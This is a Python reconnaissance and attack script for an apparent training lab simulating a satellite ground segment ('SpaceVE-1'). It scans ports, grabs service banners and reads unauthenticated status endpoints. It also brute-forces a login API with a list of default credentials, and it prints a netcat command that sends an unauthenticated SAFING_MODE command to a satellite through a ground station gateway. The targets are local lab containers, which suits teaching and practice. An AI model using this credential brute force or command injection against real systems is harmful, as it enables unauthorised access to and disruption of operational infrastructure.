#!/usr/bin/env python3
"""
ground_station_scanner.py — SpaceVE-1 Ground Segment Recon Tool
SpaceVE-1 Lab Attack Tool

Performs passive and active reconnaissance against the SpaceVE-1
ground segment (MOC and ground station) to enumerate:
  - Open ports and services
  - Exposed credentials (ground station status banner)
  - Unauthenticated API endpoints
  - Default credentials on web interface
  - Session management weaknesses
  - Telemetry data accessible without auth

From the host, only exposed ports are reachable: MOC (localhost:8080),
GS-BETA (localhost:4820). Internal IPs (192.168.61/62/63.x) are only
reachable from inside the Docker networks.

Usage:
  python3 ground_station_scanner.py
  python3 ground_station_scanner.py --target moc
  python3 ground_station_scanner.py --target gs
  python3 ground_station_scanner.py --target all

Common Beginner Mistakes:
  - Scanning satellite UDP port from outside Docker won't work; use ccsds_packet_forge.py via GS-BETA relay
  - The MOC has no /api/telemetry endpoint; use /status for health or ws://localhost:8765 for live TLM
  - GS-BETA login is POST /api/login, not /login
"""

import argparse
import json
import socket
import sys

import requests

MOC_HOST = "127.0.0.1"
MOC_PORT = 8080
GS_HOST = "127.0.0.1"
GS_CMD_PORT = 4820
SATELLITE_IP = "192.168.61.100"  # only reachable from inside Docker cmd network

CREDENTIALS_TO_TRY = [
    ("admin", "admin"),
    ("admin", "admin123"),
    ("admin", "password"),
    ("operator", "operator"),
    ("user", "user"),
    ("root", "root"),
]


def banner(title: str):
    print(f"\n  [{title}]")
    print(f"  {'=' * (len(title) + 2)}")


def scan_tcp_port(host: str, port: int) -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def grab_tcp_banner(host: str, port: int) -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        data = sock.recv(1024)
        sock.close()
        return data.decode("utf-8", errors="replace").strip()
    except Exception as e:
        return f"(error: {e})"


def scan_moc():
    banner("MOC Reconnaissance")

    # Port check
    open_moc = scan_tcp_port(MOC_HOST, MOC_PORT)
    print(f"  Port {MOC_HOST}:{MOC_PORT}/tcp: {'OPEN' if open_moc else 'CLOSED'}")
    if not open_moc:
        print("  MOC not reachable. Check: cd lab && docker compose up -d")
        return

    # Status endpoint (no auth required)
    try:
        r = requests.get(f"http://{MOC_HOST}:{MOC_PORT}/status", timeout=3)
        print(f"  GET /status (NO AUTH): {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"    moc_id:             {data.get('moc_id', '?')}")
            print(f"    uptime_s:           {data.get('uptime_s', '?')}")
            print(f"    satellites_tracked: {data.get('satellites_tracked', '?')}")
            print(f"    ws_clients:         {data.get('ws_clients', '?')}")
            print(f"  *** MOC STATUS READABLE WITHOUT AUTH ***")
    except Exception as e:
        print(f"  GET /status: error ({e})")

    # WebSocket TLM stream (no auth)
    print(f"\n  WebSocket TLM (ws://{MOC_HOST}:8765) — no auth required (MC-MOC-1)")
    print(f"    Connect with: wscat -c ws://{MOC_HOST}:8765")
    print(f"    Or: python3 -c \"import websockets,asyncio; ...")

    # Credential brute force on actual login endpoint
    print(f"\n  Credential enumeration (POST /api/login):")
    session = requests.Session()
    for user, pwd in CREDENTIALS_TO_TRY:
        try:
            r = session.post(
                f"http://{MOC_HOST}:{MOC_PORT}/api/login",
                json={"username": user, "password": pwd},
                timeout=3
            )
            if r.status_code == 200:
                data = r.json()
                token = data.get("token", "")
                print(f"    {user}:{pwd} — VALID  token={token[:20]}...")
                print(f"    *** VALID CREDENTIALS FOUND: {user}:{pwd} ***")
            else:
                print(f"    {user}:{pwd} — {r.status_code} invalid")
        except Exception as e:
            print(f"    {user}:{pwd} — error ({e})")

    print()


def scan_gs():
    banner("Ground Station Reconnaissance")

    # GS-BETA command gateway (exposed on localhost:4820)
    open_cmd = scan_tcp_port(GS_HOST, GS_CMD_PORT)
    print(f"  Port {GS_HOST}:{GS_CMD_PORT}/tcp (GS-BETA cmd gateway): {'OPEN' if open_cmd else 'CLOSED'}")

    if open_cmd:
        banner_text = grab_tcp_banner(GS_HOST, GS_CMD_PORT)
        print(f"\n  GS-BETA banner:")
        for line in banner_text.splitlines():
            print(f"    {line}")
        if "MAINTENANCE" in banner_text:
            print("\n  *** GS-BETA IS IN MAINTENANCE MODE — NO AUTH REQUIRED (MC-GS-3) ***")
            print("  Exploit: nc localhost 4820")
            print("           SENDCMD SpaceVE-1A SAFING_MODE")


def scan_satellite():
    banner("Satellite Port Recon (passive)")
    print(f"  {SATELLITE_IP}:1234/udp — CCSDS command port (no auth)")
    print(f"  Cannot be confirmed via simple TCP probe (UDP — use ccsds_packet_forge.py inside Docker)")
    print(f"  From host: use GS-BETA relay (localhost:4820) instead of direct UDP")


def main():
    p = argparse.ArgumentParser(description="SpaceVE-1 ground segment recon")
    p.add_argument("--target", choices=["moc", "gs", "satellite", "all"], default="all")
    args = p.parse_args()

    print("\n  SpaceVE-1 Ground Segment Scanner")
    print("  ==================================")

    if args.target in ("moc", "all"):
        scan_moc()
    if args.target in ("gs", "all"):
        scan_gs()
    if args.target in ("satellite", "all"):
        scan_satellite()

    print("\n  Scan complete.\n")


if __name__ == "__main__":
    main()
